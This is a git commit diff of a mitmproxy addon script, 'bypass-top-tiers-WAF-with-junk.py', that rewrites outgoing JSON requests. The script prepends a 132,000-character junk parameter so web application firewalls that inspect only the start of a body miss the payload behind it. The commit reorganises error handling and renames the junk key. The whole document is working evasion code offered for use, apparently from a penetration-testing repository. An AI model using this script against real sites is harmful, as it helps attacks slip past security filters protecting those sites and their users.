1127b3549f320c6b054b3023abba68caebdf5f46
David Botelho Mariano <48680041+david-botelho-mariano@users.noreply.github.com>
2024-09-29 16:53:53 -0300

    Update bypass-top-tiers-WAF-with-junk.py

--- bypass-top-tiers-WAF-with-junk.py
+++ bypass-top-tiers-WAF-with-junk.py
@@ -3,20 +3,23 @@ import json
 from collections import OrderedDict
 
 def request(flow: http.HTTPFlow) -> None:
-    # Check if the request is of type application/json
-    content_type = flow.request.headers.get('Content-Type', '')
+
+    try:
+        # Check if the request is of type application/json
+        content_type = flow.request.headers.get('Content-Type', '')
     
-    if 'application/json' in content_type:
-        try:
+        if 'application/json' in content_type:
             # Attempt to parse the JSON body
             body_json = json.loads(flow.request.text, object_pairs_hook=OrderedDict)
-        except Exception as e:
-            # Skip processing if there's an error in parsing JSON
-            print(f"Error processing JSON: {e}")
-            return
 
-        # Insert the new key-value pair at the top
-        new_body_json = OrderedDict([('daviMariano', '0' * 132000)] + list(body_json.items()))
+            # Insert the new key-value pair at the top
+            new_body_json = OrderedDict([('ParameterNameThatDoesNotExist', '0' * 132000)] + list(body_json.items())) # 132000 characters
 
-        # Convert JSON back to a string and update the request body
-        flow.request.text = json.dumps(new_body_json)
+            # Convert JSON back to a string and update the request body
+            flow.request.text = json.dumps(new_body_json)
+    except Exception as e:
+        # Skip processing if there's an error in parsing JSON
+        print(f"Error processing JSON: {e}")
+        return
+
+
